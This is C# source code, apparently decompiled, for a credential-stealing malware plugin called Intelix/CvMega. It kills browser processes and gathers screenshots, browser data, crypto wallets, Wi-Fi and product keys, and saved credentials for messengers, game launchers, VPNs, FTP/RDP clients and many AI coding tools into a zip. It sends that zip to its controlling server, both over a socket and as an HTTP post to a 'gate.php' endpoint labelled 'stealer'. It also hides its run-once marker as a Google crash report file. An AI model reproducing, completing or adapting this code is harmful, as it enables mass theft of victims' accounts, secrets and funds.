using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using CvMega.Helper;
using Intelix.Helper;
using Intelix.Helper.Data;
using Intelix.Targets;
using Intelix.Targets.Applications;
using Intelix.Targets.Browsers;
using Intelix.Targets.Crypto;
using Intelix.Targets.Device;
using Intelix.Targets.Games;
using Intelix.Targets.Messangers;
using Intelix.Targets.Vpn;
using Intelix.Targets.AI_Agent;
using Leb128;
using Helper = Plugin.Helper;

namespace Plugin
{
	// Token: 0x02000081 RID: 129
	public class Plugin
	{
		// Token: 0x06000204 RID: 516 RVA: 0x00019E10 File Offset: 0x00018010
		public void Run(Socket TcpClient, X509Certificate2 x509Certificate2, string Hwid, byte[] Pack)
		{
			Plugin.tcpClient = TcpClient;
			Plugin.hwid = Hwid;
			Plugin.X509Certificate2 = x509Certificate2;
			string tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
			Thread.Sleep(50);
			Helper.Client.Connect(Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[0], Plugin.tcpClient.RemoteEndPoint.ToString().Split(new char[] { ':' })[1]);
			if (!Helper.Client.itsConnect)
			{
				Helper.Client.Disconnect();
				Thread.Sleep(5000);
				return;
			}
			try
			{
				Directory.CreateDirectory(tempDir);
				DynamicFiles.basePath = tempDir;
				byte[] zipBytes = null;
				using (InMemoryZip zip = new InMemoryZip())
				{
					Counter counter = new Counter();
					Task.WaitAll(
						Task.Run(() =>
						{
							Parallel.ForEach(Plugin.targets, target => { try { target.Collect(zip, counter); } catch { } });
						}),
						Task.Run(() =>
						{
							ProcessKiller.KillerAll();
							Thread.Sleep(100);
							Parallel.ForEach(Plugin.targetsBrowsers, target => { try { target.Collect(zip, counter); } catch { } });
						})
					);
					counter.Collect(zip);
					zipBytes = zip.ToArray(CompressionLevel.Fastest);
				}
				byte[] payload = null;
				if (zipBytes != null && zipBytes.Length > 0)
				{
					payload = Leb128.Leb128.Write(new object[] { "Intelix.zip", zipBytes });
				}
				if (payload != null && payload.Length > 0)
				{
					Helper.Client.Send(Leb128.Leb128.Write(new object[] { "Recovery", Hwid, payload }));
				}
			}
			catch (Exception ex)
			{
				Helper.Client.Error(ex.Message);
			}
			finally
			{
				try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); }
				catch { }
			}
			while (Helper.Client.itsConnect)
			{
				Thread.Sleep(1000);
			}
			Helper.Client.Disconnect();
			Thread.Sleep(5000);
		}

		// Token: 0x06000205 RID: 517 RVA: 0x00019FC8 File Offset: 0x000181C8
		public void Start(string host, string hwid, string taskid, string arguments)
		{
			CvMega.Helper.Client.currentHost = host;
			bool flag = arguments.Contains("--run-once");
			if (flag)
			{
				string path = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Google\\crashreport.txt";
				bool flag2 = File.Exists(path);
				if (flag2)
				{
					return;
				}
				File.Create(path);
			}
			InMemoryZip zip = new InMemoryZip();
			try
			{
				Counter counter = new Counter();
				Task.WaitAll(new Task[]
				{
					Task.Run(delegate()
					{
						Parallel.ForEach<ITarget>(Plugin.targets, delegate(ITarget target)
						{
							try
							{
								target.Collect(zip, counter);
							}
							catch
							{
							}
						});
					}),
					Task.Run(delegate()
					{
						ProcessKiller.KillerAll();
						Thread.Sleep(200);
						Parallel.ForEach<ITarget>(Plugin.targetsBrowsers, delegate(ITarget target)
						{
							try
							{
								target.Collect(zip, counter);
							}
							catch
							{
							}
						});
					})
				});
				counter.Collect(zip);
				CvMega.Helper.Client.SendGetRequest(new Dictionary<string, string>
				{
					{
						"command",
						"taskrun"
					},
					{
						"taskid",
						taskid
					}
				});
				Plugin.SendFile(host + "/gate.php", zip.ToArray(CompressionLevel.Fastest), hwid);
			}
			finally
			{
				bool flag3 = zip != null;
				if (flag3)
				{
					((IDisposable)zip).Dispose();
				}
			}
		}

		// Token: 0x06000206 RID: 518 RVA: 0x0001A118 File Offset: 0x00018318
		public static void SendFile(string url, byte[] file, string fileName)
		{
			bool flag = file == null || file.Length == 0;
			if (flag)
			{
				Console.WriteLine("Файл пустой или не задан.");
			}
			else
			{
				using (HttpClient httpClient = new HttpClient())
				{
					httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("cvmega");
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					multipartFormDataContent.Add(new ByteArrayContent(file)
					{
						Headers = 
						{
							ContentType = MediaTypeHeaderValue.Parse("application/zip")
						}
					}, SimpleEncryptor.Hash("file"), SimpleEncryptor.EncryptNonEnc(fileName));
					multipartFormDataContent.Add(new StringContent(SimpleEncryptor.EncryptNonEnc("stealer")), SimpleEncryptor.Hash("command"));
					try
					{
						HttpResponseMessage result = httpClient.PostAsync(url, multipartFormDataContent).Result;
					}
					catch
					{
					}
				}
			}
		}

		// Token: 0x0400007E RID: 126
		public static List<ITarget> targetsBrowsers = new List<ITarget>
		{
			new Chromium(),
			new Gecko()
		};

		// Token: 0x0400007F RID: 127
		public static List<ITarget> targets = new List<ITarget>
		{
			new ScreenShot(),
			new GameList(),
			new InstalledBrowsers(),
			new InstalledPrograms(),
			new ProcessDump(),
			new ProductKey(),
			new SystemInfo(),
			new WifiKey(),
			new Telegram(),
			new Discord(),
			new Element(),
			new Icq(),
			new MicroSIP(),
			new Jabber(),
			new Outlook(),
			new Pidgin(),
			new Signal(),
			new Skype(),
			new Tox(),
			new Viber(),
			new MessengerMax(),
			new TelegramWeb(),
			new Minecraft(),
			new BattleNet(),
			new Epic(),
			new Riot(),
			new Roblox(),
			new Steam(),
			new Uplay(),
			new XBox(),
			new Growtopia(),
			new ElectronicArts(),
			new Rdp(),
			new AnyDesk(),
			new CyberDuck(),
			new DynDns(),
			new FileZilla(),
			new Ngrok(),
			new PlayIt(),
			new TeamViewer(),
			new WinSCP(),
			new TotalCommander(),
			new FTPNavigator(),
			new FTPRush(),
			new CoreFtp(),
			new FTPGetter(),
			new FTPCommander(),
			new TeamSpeak(),
			new Obs(),
			new GithubGui(),
			new NoIp(),
			new FoxMail(),
			new Navicat(),
			new RDCMan(),
			new Sunlogin(),
			new Xmanager(),
			new JetBrains(),
			new PuTTY(),
			new Cisco(),
			new RadminVPN(),
			new CyberGhost(),
			new ExpressVPN(),
			new HideMyName(),
			new IpVanish(),
			new MullVad(),
			new NordVpn(),
			new OpenVpn(),
			new PIAVPN(),
			new ProtonVpn(),
			new Proxifier(),
			new SurfShark(),
			new Hamachi(),
			new WireGuard(),
			new SoftEther(),
			new CryptoDesktop(),
			new Grabber(),
			new UserAgentGenerator(),
			new CryptoChromium(),
			new CryptoGecko(),
			new Cursor(),
			new Windsurf(),
			new VSCodeCopilot(),
			new Codeium(),
			new Tabnine(),
			new JetBrainsAI(),
			new AmazonCodeWhisperer(),
			new Continue(),
			new Aider(),
			new Supermaven(),
			new Kite(),
			new Pieces(),
			new Sourcegraph_Cody(),
			new Blackbox(),
			new AWSToolkit(),
			new Replit(),
			new Zed(),
			new IntelliJCopilot(),
			new VSCodeAIExtensions(),
			new Devin(),
			new Cline(),
			new Augment(),
			new VoidEditor(),
			new Trae(),
			new Copilot_CLI(),
			new Gemini_CLI(),
			new Plandex(),
			new Goose(),
			new Sweep(),
			new Mentat(),
			new Copilot_VSCode_Storage(),
			new OpenInterpreter()
		};

		// Token: 0x04000080 RID: 128
		public static Socket tcpClient;

		// Token: 0x04000081 RID: 129
		public static X509Certificate2 X509Certificate2;

		// Token: 0x04000082 RID: 130
		public static string hwid;
	}
}
